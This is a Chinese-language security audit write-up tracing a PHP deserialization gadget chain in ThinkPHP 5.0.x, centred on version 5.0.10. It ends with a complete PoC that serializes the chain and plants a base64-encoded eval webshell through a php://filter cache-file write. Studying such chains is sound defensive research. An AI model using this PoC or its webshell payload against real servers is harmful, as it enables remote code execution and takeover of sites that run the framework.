下面的审计以thinkphp5.0.10为例，因为这个版本很奇葩，别的版本的poc在它这一直行不通，向上也不兼容，向下也不兼容。如果能在该版本下使用poc大概率是能覆盖thinkphp5.0.4-thinkphp5.0.24的。
还是先看最老的套路能不能行的通，走Window下的__destruct触发Model类的__toString。看下该版本的Model类的toArray方法（前面的过程没有任何变化）
        public function toArray()
        {
            $item    = [];
            $visible = [];
            $hidden  = [];
            $data = array_merge($this->data, $this->relation);
            // 过滤属性
            if (!empty($this->visible)) {
                $array = $this->parseAttr($this->visible, $visible);
                $data  = array_intersect_key($data, array_flip($array));
            } elseif (!empty($this->hidden)) {
                $array = $this->parseAttr($this->hidden, $hidden, false);
                $data  = array_diff_key($data, array_flip($array));
            }
            foreach ($data as $key => $val) {
                if ($val instanceof Model || $val instanceof ModelCollection) {
                    // 关联模型对象
                    $item[$key] = $this->subToArray($val, $visible, $hidden, $key);
                } elseif (is_array($val) && reset($val) instanceof Model) {
                    // 关联模型数据集
                    $arr = [];
                    foreach ($val as $k => $value) {
                        $arr[$k] = $this->subToArray($value, $visible, $hidden, $key);
                    }
                    $item[$key] = $arr;
                } else {
                    // 模型属性
                    $item[$key] = $this->getAttr($key);
                }
            }
            // 追加属性（必须定义获取器）
            if (!empty($this->append)) {
                foreach ($this->append as $key => $name) {
                    if (is_array($name)) {
                        // 追加关联对象属性
                        $relation   = $this->getAttr($key);
                        $item[$key] = $relation->append($name)->toArray();
                    } elseif (strpos($name, '.')) {
                        list($key, $attr) = explode('.', $name);
                        // 追加关联对象属性
                        $relation   = $this->getAttr($key);
                        $item[$key] = $relation->append([$attr])->toArray();
                    } else {
                        $item[$name] = $this->getAttr($name);
                    }
                }
            }
            return !empty($item) ? $item : [];
        }
        public function getAttr($name)
        {
            try {
                $notFound = false;
                $value    = $this->getData($name);
            } catch (InvalidArgumentException $e) {
                $notFound = true;
                $value    = null;
            }
            // 检测属性获取器
            $method = 'get' . Loader::parseName($name, 1) . 'Attr';
            if (method_exists($this, $method)) {
                $value = $this->$method($value, $this->data, $this->relation);
            } elseif (isset($this->type[$name])) {
                // 类型转换
                $value = $this->readTransform($value, $this->type[$name]);
            } elseif (in_array($name, [$this->createTime, $this->updateTime])) {
                if (is_string($this->autoWriteTimestamp) && in_array(strtolower($this->autoWriteTimestamp), [
                    'datetime',
                    'date',
                    'timestamp',
                ])
                ) {
                    $value = $this->formatDateTime(strtotime($value), $this->dateFormat);
                } else {
                    $value = $this->formatDateTime($value, $this->dateFormat);
                }
            } elseif ($notFound) {
                $relation = Loader::parseName($name, 1, false);
                if (method_exists($this, $relation)) {
                    $modelRelation = $this->$relation();
                    // 不存在该字段 获取关联数据
                    $value = $this->getRelationData($modelRelation);
                    // 保存关联对象值
                    $this->relation[$name] = $value;
                } else {
                    throw new InvalidArgumentException('property not exists:' . $this->class . '->' . $name);
                }
            }
            return $value;
        }
        public function getData($name = null)
        {
            if (is_null($name)) {
                return $this->data;
            } elseif (array_key_exists($name, $this->data)) {
                return $this->data[$name];
            } elseif (array_key_exists($name, $this->relation)) {
                return $this->relation[$name];
            } else {
                throw new InvalidArgumentException('property not exists:' . $this->class . '->' . $name);
            }
        }
仔细观察发现，如果我们能够正常进入if
(!empty($this->append)){…}分支，通过getData，我们可以实例化其它类，从而调用其它类具有的append方法或者__call魔术方法。而且可控变量很多，$this->append不为空，将需要实例化的类放入$this->data或者$this->relation，跳过getAttr方法中所有可能遇到的类型转换即可。最终将$this->append数组中的对应值修改成数组即可进入下列语句：
        $relation   = $this->getAttr($key);
        $item[$key] = $relation->append($name)->toArray();
在审计到这时，似乎已经可以触发前面所提到的think\console\Output类的__call了，而且也具有参数。但是在实际过程中，又走到了一生之敌的app
error。希望的参数是string类型，给的却是数组。那么如果__call方法不能用的话，是不是可以看看有没有其它类中的append方法，可以做跳板呢。
具有append方法的类并不多，只有两个，一个是Model一个是Collection，跟进查看
    //Model
        public function append($append = [], $override = false)
        {
            $this->append = $override ? $append : array_merge($this->append, $append);
            return $this;
        }
不存在利用点
        public function append($append = [], $override = false)
        {
            $this->each(function ($model) use ($append, $override) {
                /** @var Model $model */
                $model->append($append, $override);
            });
            return $this;
        }
这边的参数仍然会是数组，依旧不能直接触发think\console\Output类的__call。同样查看其它类的__call也存在类似问题，所以这条反序列化的链子似乎已经走到死胡同了。但是在已经成为了抽象类的Relation却带来了新的利用方式，但是现在的Relation的__call方法和之前也不大一样了。
        abstract protected function baseQuery();
        public function __call($method, $args)
        {
            if ($this->query) {
                // 执行基础查询
                $this->baseQuery();
                $result = call_user_func_array([$this->query, $method], $args);
                if ($result instanceof Query) {
                    return $this;
                } else {
                    $this->baseQuery = false;
                    return $result;
                }
            } else {
                throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
            }
        }
    }
按照之前的分析来看，下面的call_user_func_array是无法有效利用的，所以如果要想找跳板的话，必然是利用了baseQuery方法。
查看后发现触发条件最简单的是think\model\relation\HasMany类中的baseQuery方法。
        protected function baseQuery()
        {
            if (empty($this->baseQuery)) {
                if (isset($this->parent->{$this->localKey})) {
                    // 关联查询带入关联条件
                    $this->query->where($this->foreignKey, $this->parent->{$this->localKey});
                }
                $this->baseQuery = true;
            }
        }
具有可控参数和触发__call的条件。后面就算将$this->query赋值为think\console\Output类实例，然后和前面低版本的一样触发就行。但是这个还存在一个问题。因为前面触发的toArray的if
(!empty($this->append)){…}分支是在thinkphp5.0.05（包括5.0.05）之后才存在的。也就是说这条链子在thinkphp5.0.04版本是行不通的。这时候我们想起了之前对于thinkphp5.0.03版本的反序列化链的挖掘。
和前面低版本的链子一样，直接触发__call方法，但是此时的Relation已经是抽象类了，无法作为跳板利用。结合之前的分析，这边我们采用think\model\relation\HasMany作为跳板进行构造。和低版本相比，除了中间利用了Relation类的子类作为跳板之外，其它地方没有任何区别。  
poc
    namespace think;
    use think\model\relation\HasMany;
    class Process
    {
        private $processPipes;
        private $status;
        private $processInformation;
        public function  __construct(){
            $this->processInformation['running']=true;
            $this->status=3;
            $this->processPipes=new HasMany();
        }
    }
     namespace think;
     class Model{
     }
     namespace think\model;
     use think\Model;
     class Merge extends Model{
         public $a='1';
         public function __construct()
         {
         }
     }
    namespace think\model\relation;
    use think\console\Output;
    use think\db\Query;
    use think\model\Merge;
    use think\model\Relation;
    class HasMany extends Relation
    {
        //protected $baseQuery=true;
        protected $parent;
        protected $localKey='a';
        protected $foreignKey='a';
        protected $pivot;
        public function __construct(){
            $this->query=new Output();
            $this->parent= new Merge();
        }
    }
    namespace think\model;
    class Relation
    {}
    namespace think\db;
    class Query{}
    namespace think\console;
    class Output{
        protected $styles = [
            'info',
            'error',
            'comment',
            'question',
            'highlight',
            'warning',
            'getTable',
            'where'
        ];
        private $handle;
        public function __construct()
        {
            $this->handle = (new \think\session\driver\Memcache);
        }
    }
    namespace think\session\driver;
    class Memcache
    {
        protected $handler;
        public function __construct()
        {
            $this->handler = (new \think\cache\driver\Memcached);
        }
    }
    namespace think\cache\driver;
    class Memcached
    {
        protected $tag;
        protected $options;
        protected $handler;
        public function __construct()
        {
            $this->tag = true;
            $this->options = [
                'expire'   => 0,
                'prefix'   => 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
            ];
            $this->handler = (new File);
        }
    }
    class File
    {
        protected $tag;
        protected $options;
        public function __construct()
        {
            $this->tag = false;
            $this->options = [
                'expire'        => 3600,
                'cache_subdir'  => false,
                'prefix'        => '',
                'data_compress' => false,
                'path'          => 'php://filter/convert.base64-decode/resource=./',
            ];
        }
    }
    echo urlencode(serialize(new \think\Process()));
效果如下：
## 3\. 总结
如果是从think\process\pipes\Windows的__destruct方法出发，则必须要关注think\Model的toArray方法是否存在利用点，且toArray方法受版本影响较大，经常改变。如果think\Process的__destruct方法出发则需要关注Relation类是否已经变为抽象类，该变化是从thinkphp5.0.04版本开始。之后利用就再无其它变化影响。网上的大部分高版本链子都是从think\process\pipes\Windows的__destruct方法出发，所以在遇到低版本时，会出现错误。判断这类高版本链子在不同版本下是否可用的关键就在于是否在toArray中存在触发点。网上已有的高版本链子我也就不加赘述，拾人牙慧了。